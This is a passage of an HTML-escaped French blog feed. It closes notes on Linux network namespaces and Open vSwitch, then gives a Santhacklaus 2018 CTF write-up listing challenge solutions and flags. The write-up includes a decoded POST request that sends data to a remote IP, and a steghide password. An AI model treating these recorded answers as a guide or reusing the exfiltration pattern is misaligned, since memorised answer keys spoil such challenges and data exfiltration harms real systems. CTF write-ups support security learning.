ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;h1-eth0 netns h1
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;h2-eth0 netns h2

&lt;span class=&quot;c&quot;&gt;# afficher le lien depuis le namespace&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;show &lt;span class=&quot;c&quot;&gt;#4&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;show

&lt;span class=&quot;c&quot;&gt;# connecter les liens au switch&lt;/span&gt;
ovs-vsctl add-port s1 s1-h1 &lt;span class=&quot;c&quot;&gt;#2&lt;/span&gt;
ovs-vsctl add-port s1 s1-h2
ovs-vsctl show

&lt;span class=&quot;c&quot;&gt;# activer les interfaces du namespace root #5&lt;/span&gt;
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev s1-h1 up
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev s1-h2 up

&lt;span class=&quot;c&quot;&gt;# activer les interfaces  des namespaces h1 et h2 #6&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev h1-eth0 up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev h2-eth0 up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# changer adresse MAC d'une interface&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 address 01:02:03:04:05:06
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vérification de la config. du switch, couche niveau 2, link layer&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ovs-ofctl show s1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ovs-vsctl show
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Config de la couche 3, network&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# config IP pour h1 et h2&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip addr add dev h1-eth0 10.0.0.1/24
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ip addr add dev h2-eth0 10.0.0.2/24

&lt;span class=&quot;c&quot;&gt;# tester&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.0.0.1

&lt;span class=&quot;c&quot;&gt;# écoute trafique directement sur interface d'un netns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; s1-h1

&lt;span class=&quot;c&quot;&gt;# changer prompt et indique le netns du shell courant&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;change_prompt
&lt;span class=&quot;nv&quot;&gt;INTERFACE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;ip l | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[ -]&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/eth0/ { print &quot;[&quot; $2 &quot;]&quot; }'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PS1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$INTERFACE$PS1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#PS1=&quot;h1:\w &quot;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;change_prompt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;h1]root@cube:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aller plus loin dans les netns&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# remplacer fichier de conf dans un netns, ex: resolv.conf&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;--bind&lt;/span&gt; /home/rezo/resolv.conf /etc/resolv.conf

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;more /etc/resolv.conf
nameserver 8.8.8.8
nameserver 8.8.4.4
&lt;span class=&quot;c&quot;&gt;# Ne marche que pour le shell qui a exécuté la commande : une fois le shell fermé le point de montage n’existe plus.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# utiliser un shell dans un netns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; pef bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# conf example&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# create namespaces&lt;/span&gt;
ip netns add h1
ip netns add h2
ip netns add r1

&lt;span class=&quot;c&quot;&gt;# create switch &lt;/span&gt;
ovs-vsctl add-br s1 
ovs-vsctl add-br s2

&lt;span class=&quot;c&quot;&gt;# create link&lt;/span&gt;
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add h1-eth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name s1-h1
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add h2-eth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name s2-h2

ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add r1-eth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name s1-r1
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add r1-eth1 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name internet-r1

&lt;span class=&quot;c&quot;&gt;# connect links to namespaces&lt;/span&gt;
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;h1-eth0 netns h1
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;h2-eth0 netns h2
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;r1-eth0 netns r1
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;r1-eth1 netns r1

&lt;span class=&quot;c&quot;&gt;# connect switch link&lt;/span&gt;
ovs-vsctl add-port s1 s1-h1 
ovs-vsctl add-port s1 s1-r1
ovs-vsctl add-port s2 s2-h2 
ovs-vsctl add-port s2 s2-r2

&lt;span class=&quot;c&quot;&gt;# enable root namespace interfaces&lt;/span&gt;
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev s1-h1 up
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev s2-h2 up
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev s1-r1 up
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev s2-r1 up

&lt;span class=&quot;c&quot;&gt;# enable interfaces of h1 and h2 &lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev h1-eth0 up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev h2-eth0 up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev lo up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev lo up

&lt;span class=&quot;c&quot;&gt;# enable interfaces of r1&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;r1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev r1-eth0 up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;r1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev r1-eth1 up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;r1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev lo up

&lt;span class=&quot;c&quot;&gt;# configure s1 and s2 network&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;r1 ip addr add dev r1-eth0 192.168.10.254/24
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip addr add dev h1-eth0 192.168.10.1/24
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;r1 ip a add dev r1-eth1 10.0.0.1/24
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ip addr add dev h2-eth0 10.0.0.126/24

&lt;span class=&quot;c&quot;&gt;# configur r1 routes&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;r1 ip r add 192.168.20.0/24 via 10.0.0.2

&lt;span class=&quot;c&quot;&gt;# configur default route on h1 and h2&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip r add default via 192.168.10.254
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h2 ip r add default via 192.168.20.254

&lt;span class=&quot;c&quot;&gt;# enable forwarding in r1&lt;/span&gt;
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;r1 &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;sysctl net.ipv4.conf.all.forwarding&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1

&lt;span class=&quot;c&quot;&gt;##############################&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# display all netns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip &lt;span class=&quot;nt&quot;&gt;--all&lt;/span&gt; netns

&lt;span class=&quot;c&quot;&gt;# execute cmd in h1 netns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 ip &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# start bash with root user in h1 netns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 bash

&lt;span class=&quot;c&quot;&gt;# start bash with adel user in h1 netns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; adel bash

&lt;span class=&quot;c&quot;&gt;# know mac address&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip neighbor

&lt;span class=&quot;c&quot;&gt;# launch tcp server socket&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;socat tcp-listen:6789 -

&lt;span class=&quot;c&quot;&gt;# connect to tcp socket&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;socat - tcp:10.0.0.12:6789

&lt;span class=&quot;c&quot;&gt;# show tcp streams&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;conntrack &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# exec app in netns&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 firefox
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;h1 &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; adel firefox

&lt;span class=&quot;c&quot;&gt;# debit test&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iperf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# start server&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;iperf &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10.0.0.12 &lt;span class=&quot;c&quot;&gt;# test&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# start dnsmasq, dhcp server on netork&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dnsmasq &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; 192.168.10.100,192.168.10.150,255.255.255.0

&lt;span class=&quot;c&quot;&gt;# client&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dhclient
&lt;span class=&quot;c&quot;&gt;# obtient, addr ip, prefixe, et route pa défaut passant par le routeur&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Santhacklaus CTF</title>
   <link href="http://localhost:4000/ctf/2018/12/21/ctf-santhacklaus/"/>
   <updated>2018-12-21T00:00:00+01:00</updated>
   <id>http://localhost:4000/ctf/2018/12/21/ctf-santhacklaus</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;0-bonjour-ok&quot;&gt;0 Bonjour OK&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Just submit this flag ;) That’s what you’re supposed to find in every challenge and then submit to earn points !&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{BaguetteForXMAS}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;50-i-got-404-problems&quot;&gt;50 I got 404 problems&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;404 : page not found ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://santhacklaus.xyz/abc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Th3_P4g3_w4s_n0T_f0uNd}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;50-playa-del-fuego&quot;&gt;50 Playa del fuego&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;We intercepted this document. Uncover the redacted part.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;pdf avec le flag en bas, ecrit en noir avec fond noir&lt;/li&gt;
  &lt;li&gt;copier le flag et le coller quelque part d’autre&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Bl4ck_0n_Bl4ck_isAbadIDEA}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;50-trashack&quot;&gt;50 Trashack&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;We got in! We found something weird. Uncover the truth!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.jpg&lt;/code&gt; avec le début du flag, ouvrir les yeux pour lire le suite&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{P4P3}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;50-haystack&quot;&gt;50 Haystack&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Find the needle. Be wise, patient and clever. Don’t try to rush things. You only have ONE TRY….&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;fichier texte avec un grand nombre de flag potentiels&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;challenge.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IMTLD{&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;}&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# merci Mel ;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;challenge.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IMTLD{.*}&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{26650fdec09ef3ac4b602a79a0384306}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;100-slept-on-the-kayboard&quot;&gt;100 Slept on the kayboard&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;A super hacker has find a way to hide a super secret message ! Can you find the super secret message hidden by the super hacker and become a super hacker yourself ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;QRcode qui stocke du binaire&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# binary to ascii&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;obase=16; ibase=2; &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;zbarimg &lt;span class=&quot;nt&quot;&gt;--raw&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./qrcode.png&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | bc | xxd &lt;span class=&quot;nt&quot;&gt;-ps&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# binary to b16 to ascii&lt;/span&gt;
9999dddd44444cccc4444bbbbbbb33334444444444000eeeeee44444888888333bbbb33399999992222220004442222222444444ddddddd
49  4D  54   4C  44  7B     43  34 74     30 6E    54   68    33 4B  33 79     62    30 34 72     64    7D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# hex to ascii
# python3
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'494D544C447B433474306E5468334B337962303472647D'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{C4t0nTh3K3yb04rd}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;100-whats-his-name&quot;&gt;100 What’s his name&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Johnson ! We manage to get a packet capture of the network of a hacker ! Find his password !
Submit the flag as IMTLD{password}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;.pcapng&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;ouvir avec wireshark&lt;/li&gt;
  &lt;li&gt;sur le premier paquet: &lt;code class=&quot;highlighter-rouge&quot;&gt;Analyze &amp;gt; Follow &amp;gt; TCP Stream&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;et trouver le mot de passe&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{W4tch4_W4tch4}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;100-authentification-20&quot;&gt;100 Authentification 2.0&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Did you GET it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# requête POST avec username = admin&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=admin&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://authentication.santhacklaus.xyz/'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Y0u_H4v3_t0_st4rT_s0m3Wh3r3}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;100-xtracted&quot;&gt;100 Xtracted&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;A little thug played with us. He extracted information from our server and just sent us what he got. But our engineers were unable to read it. Help us please! 😭&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# with Brainfuck Interpreter we have:&lt;/span&gt;
POST / HTTP/1.1
Host:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;51.75.202.1134
Content-Type:Japplication/x-www-form-urlencoded
&lt;span class=&quot;nv&quot;&gt;Textraction_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IMTLD&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Xtr4ct_D4t4_T0_r3m0t3_s3rv3R&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;150-stego101&quot;&gt;150 Stego101&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;A g(r)eek riddle.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file challenge2.jpg
challenge2.jpg: JPEG image data, JFIF standard 1.01, resolution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, density 300x300, segment length 16, comment: &lt;span class=&quot;s2&quot;&gt;&quot;steghide : doyouknowdaway&quot;&lt;/span&gt;, baseline, precision 8, 297x153, frames 3

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;steghide extract &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; challenge.jpg &lt;span class=&quot;c&quot;&gt;# password = doyouknowdaway&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
